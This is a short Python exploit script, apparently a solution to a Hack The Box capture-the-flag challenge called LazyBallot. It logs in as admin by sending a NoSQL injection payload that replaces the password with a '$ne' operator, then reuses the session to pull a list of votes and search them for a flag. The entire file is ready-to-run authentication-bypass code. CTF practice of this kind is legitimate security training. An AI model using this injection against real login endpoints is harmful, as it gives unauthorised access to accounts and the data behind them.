import sys
import requests
import re

def exploit(target_host):
    # Define URLs for login and vote list
    base_url = f"http://{target_host}"
    login_endpoint = f"{base_url}/api/login"
    votes_endpoint = f"{base_url}/api/votes/list"

    # NoSQL injection payload
    nosql_payload = {
        "username": "admin",
        "password": {"$ne": 1}
    }

    # Start session to maintain cookies
    session = requests.Session()

    # Login request with injection payload
    login_response = session.post(login_endpoint, json=nosql_payload, timeout=5)
    if "authenticated" not in login_response.text.lower():
        print(login_response.text)
        sys.exit(1)

    # Fetch votes using session
    votes_response = session.get(votes_endpoint, timeout=5)
    votes_response.raise_for_status()

    try:
        json_data = votes_response.json()
        votes_list = json_data.get("resp", {}).get("votes", [])

        for index, vote_entry in enumerate(votes_list):
            vote_data = vote_entry.get("doc", {})
            for field_name, field_value in vote_data.items():
                if isinstance(field_value, str) and re.match(r"HTB\{.*?\}", field_value):
                    print(f"Flag found: {field_value}")
                    return
        print("Flag not found in any vote field.")
    except Exception as parsing_error:
        print(f"Failed to parse votes: {parsing_error}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 LazyBallot.py ip:port")
        sys.exit(1)

    exploit(sys.argv[1])
